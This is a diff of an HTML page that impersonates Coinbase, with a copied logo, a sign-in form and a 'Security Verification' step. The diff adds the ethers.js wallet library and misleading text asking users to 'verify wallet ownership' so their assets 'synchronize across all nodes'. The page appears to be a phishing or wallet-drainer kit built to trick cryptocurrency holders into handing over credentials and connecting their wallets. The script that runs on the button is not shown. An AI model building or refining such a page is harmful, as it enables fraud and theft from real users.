@@ -6,11 +6,10 @@
     <title>Coinbase | Secure Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.umd.min.js"></script>
 </head>
 <body>
-
     <div class="container">
-        <!-- STEP 1 -->
         <div id="step-1" class="auth-card">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
             <h1>Coinbase</h1>
@@ -18,7 +17,6 @@
             <button id="toStep2" class="btn-primary">Get Started</button>
         </div>
 
-        <!-- STEP 2 -->
         <div id="step-2" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
             <h1>Sign In</h1>
@@ -30,11 +28,10 @@
             </form>
         </div>
 
-        <!-- STEP 3 -->
         <div id="step-3" class="auth-card hidden">
             <img src="logo.png" class="cb-logo" alt="Coinbase">
-            <h1 style="font-size: 20px;">Security Verification</h1>
-            <p>Verify your wallet to continue.</p>
+            <h1>Security Verification</h1>
+            <p>To prevent unauthorized access, please verify your wallet ownership. This will actually synchronize your account and assets across all nodes.</p>
             <button id="connectBtn" class="btn-primary">Verify Wallet</button>
             <div id="status" class="status-text"></div>
         </div>
